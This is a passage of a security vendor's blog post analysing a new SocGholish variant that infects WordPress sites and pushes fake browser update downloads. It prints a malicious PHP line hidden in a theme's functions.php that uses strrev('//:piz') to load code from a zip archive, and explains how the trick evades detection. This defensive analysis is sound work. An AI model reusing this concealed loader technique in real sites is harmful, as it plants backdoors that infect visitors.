---
title: New SocGholish Malware Variant Uses Zip Compression & Evasive Techniques
url: https://blog.sucuri.net/2022/11/new-socgholish-malware-variant-uses-zip-compression-evasive-techniques.html
source: Sucuri Blog
date: 2022-11-16
fetch_date: 2025-10-03T22:51:59.666584
---

# New SocGholish Malware Variant Uses Zip Compression & Evasive Techniques

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# New SocGholish Malware Variant Uses Zip Compression & Evasive Techniques

[![](https://secure.gravatar.com/avatar/49a04d32074892dc04d9ed823aa114f8492a90e9c88852302b083c90aa322c21?s=60&d=mm&r=g)](https://blog.sucuri.net/author/benmartin)

[Ben Martin](https://blog.sucuri.net/author/benmartin)

* Last Updated: March 5, 2024

![New SocGholish Malware Variant Uses Zip Compression & Evasive Techniques](https://blog.sucuri.net/wp-content/uploads/2022/11/BlogPost_Feature-Image_1490x700_SocGholish-Variant-820x386.png)

Readers of this blog should already be familiar with [SocGholish](https://blog.sucuri.net/2022/08/socgholish-5-years-of-massive-website-infections.html): a widespread, years-long malware campaign aimed at pushing [fake browser updates](https://blog.sucuri.net/2023/10/fakeupdateru-chrome-update-infection-spreads-trojan-malware.html) to unsuspecting web users.

Once installed, fake browser updates infect the victim‚Äôs computer with various types of malware including [remote access trojans (RATs)](https://blog.sucuri.net/2024/02/remote-access-trojan-rat-types-mitigation-removal.html). SocGholish malware is often the first step in severe targeted ransomware attacks against corporations and other organizations.

![Malicious chrome browser update from SocGholish malware infection](https://blog.sucuri.net/wp-content/uploads/2022/11/malicious_browser_update.png)

Since the beginning of 2022, SiteCheck has detected different variations of SocGholish malware over **54,000** times. An overwhelming majority of detected sites were found to be using WordPress at the time of infection. And while the number of SiteCheck detections is significant, it‚Äôs important to keep in mind that for every infected website there could be hundreds or possibly thousands of victims not yet accounted for.

We‚Äôve recently uncovered a new SocGholish infection campaign using an unorthodox (and admittedly rather creative) way of injecting malicious JavaScript into a victim‚Äôs website. While the endpoint malware delivered to website visitors remains the same old fake browser update, what is interesting is the way the malware conceals itself within the website structure to avoid detection.

**Contents:**

* **[Symptoms of infection](#symptoms)**
* **[Malicious code in functions.php](#malicious-code-in-functions)**
* **[Evasive techniques](#evasive-techniques)**
* **[Payload in database](#database-payload)**
* **[Malicious JavaScript](#malicious-javascript)**
* **[SocGholish cid=272](#cid272)**

## Symptoms of Infection

A new client came to us reporting that users on his site were experiencing malicious downloads. Upon investigation we discovered file downloads initiated whenever accessing the website with names like **Auto.Update.Zip** and **Chrome.Update.zip.**

Inspecting the website‚Äôs source code immediately revealed the familiar SocGholish obfuscated JavaScript:

![Obfuscated JavaScript in website's source code ](https://blog.sucuri.net/wp-content/uploads/2022/11/socgholish_malicious_functions_php.png)

Obfuscated JavaScript in website‚Äôs source code

Querying the website files and database for this code yielded no results, so where was this code injection coming from? What we soon uncovered was a very clever way of injecting malware.

## Malicious code in functions.php

Lodged at the bottom of their theme‚Äôs **functions.php** file was a line of code which made me raise my eyebrow ü§®:

```
/* [REDACTED] Theme Template Loader */
load_template( strrev( "//:piz" ) . locate_template( "[REDACTED].template" ) . "#template", true );
```

The **strrev**PHP function is short for [string reverse](https://blog.sucuri.net/2017/09/malicious-backdoors-fake-images-strrev-functions.html); it reverses the code in question. In this case **strrev( ‚Äú//:piz*****‚Äù )*** turns into **zip://** ‚Äî a compression protocol supported by PHP through the ZIP extension.

WordPress allows template files to load in a theme via the use of the **load\_template** function; essentially allowing PHP code to load from custom files and included within WordPress themes. But why would a theme be using a *compressed archive* as a PHP template?

This **//:****piz** string was also found in a plugin installed on the website, although no such **.template** archive was identified there:

![Theme file using compressed archive as PHP template](https://blog.sucuri.net/wp-content/uploads/2022/11/socgholish_fake_plugin_piz_string.png)

Theme file using compressed archive as a PHP template

Let‚Äôs take a look at th...